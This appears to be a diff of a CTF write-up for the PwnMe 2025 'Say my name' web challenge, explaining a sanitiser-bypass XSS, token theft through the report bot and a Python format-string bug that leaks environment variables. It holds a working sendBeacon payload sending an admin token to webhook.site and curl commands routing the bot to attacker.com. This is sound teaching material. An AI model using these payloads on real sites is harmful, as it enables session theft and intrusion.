@@ -12,6 +12,8 @@ section: "CTFs"
 
 This was a medium whitebox challenge, the files are available for download [here](https://github.com/sajjadium/ctf-archives/tree/64792ed55d90e43deb30cca2aa1f09e106a0eee3/ctfs/PwnMe/2025/Quals/web/Say_my_name)
 
+## Intial look
+
 The flag is stored in the environment variables of the application:
 
 ```yaml
@@ -93,7 +95,20 @@ Some initial observations:
 - To access `/admin` we require a randomly generated `X_Admin_Token`
 - `/your-name` takes a user input on POST and renders it after sanitising it
 
+## XSS
+
 Looking at the sanitize first, it seems to not have a proper sanitisation mechanism.
+
+```python
+def sanitize_input(input_string):
+    input_string = input_string.replace('<', '')
+    input_string = input_string.replace('>', '')
+    input_string = input_string.replace('\'', '')
+    input_string = input_string.replace('&', '')
+    input_string = input_string.replace('"', '\\"')
+    input_string = input_string.replace(':', '')
+    return input_string
+```
 
 It replaces `<`, `>`, `'`, `&` and `:` with nothing, but it replaces `"` with `\\"`.
 
@@ -121,17 +136,36 @@ So the injection points are of varying interest:
 Let's make a sample payload first:
 `\";console.log(1);//`
 
+The reason this works is as `"` is replaced with `\"` when sanitised. If our input includes a backslash before we send our `"` we can escape the filtering backslash by doubling them up. This allows us to escape the `document.location` in onfocus.
+
+Eg. `"` becomes:
+```js
+document.location="https://www.behindthename.com/names/search.php?terms=\""
+```
+
+`\"` becomes:
+```js
+document.location="https://www.behindthename.com/names/search.php?terms=\\""
+```
+
+This allows us to escape the string with our payload:
+```js
+document.location="https://www.behindthename.com/names/search.php?terms=\";console.log(1);//"
+```
+
 This should print `1` to the console before redirecting. Clicking the URL that's what we see!
 
 ![saymynamexss.png](images/25-pwnmequals/saymynamexss.png)
 
-Let's use `navigator` with a `sendBeacon` to send a request to a `webhook.site` URI.
+## XSS: Exfiltration
+
+Let's use [`navigator`](https://developer.mozilla.org/en-US/docs/Web/API/Navigator) with a [`sendBeacon`](https://developer.mozilla.org/en-US/docs/Web/API/Navigator/sendBeacon) to send a request to our webhook.site URL (which will be used to steal the `X_Admin_Token`) before it redirects!.
 
 ```
 \";navigator.sendBeacon(`https${String.fromCharCode(58)}//webhook.site/9609b1f4-xxxx-xxxx-xxxx-177da4f9d6e1`);//
 ```
 
-Sure enough we get a `POST` from our serveron `webhook.site`.
+Sure enough we get a `POST` request from the webapp on webhook.site.
 
 ![saymyname-webhook.png](images/25-pwnmequals/saymyname-webhook.png)
 
@@ -169,13 +203,17 @@ if __name__ == '__main__':
     app.run(host='0.0.0.0', port=80)
 ```
 
-We can then send to the `/report` URI our server and get the token back on `webhook.site`!
+Let's host this code on `attacker.com`.
+
+We can then send out attacker URL to the `/report` endpoint, have the bot visit our site, get the token back on webhook.site!
 
 ```bash
-$ curl http://localhost:5000/report\?url\=https://attacker.com
+$ curl "http://localhost:5000/report?url=https://attacker.com"
 ```
 
 We then get a response from the server, `https://webhook.site/9609b1f4-xxxx-xxxx-xxxx-177da4f9d6e1/?c=X-Admin-Token=68fd3889bf98101b1639d81d8428955d`
+
+## Python Format Strings
 
 Woo! Now we can do that on remote and access `/admin`!
 
@@ -229,11 +267,17 @@ We can then add `.environ` to get the environment variables:
 
 We get the sample flag!
 
+## Putting it all together
+
 Let's do the steps on remote:
 
-1. Trigger the report to our webserver to steal the `X_Admin_Token`
+1. Trigger the request to the `/report` endpoint that exfiltrates the `X_Admin_Token` to our webserver.
 
-We get the token `X-Admin-Token=17c738b0787c99a392debb90bf9b57be`
+```bash
+$ curl "https://saymyname-c588791ba9cff43a.deploy.phreaks.fr/report?url=https://attacker.com"
+```
+
+We get the token on our webhook.site: `X-Admin-Token=17c738b0787c99a392debb90bf9b57be`
 
 2. Use that token to get the flag from the Python format string vulnerability
 
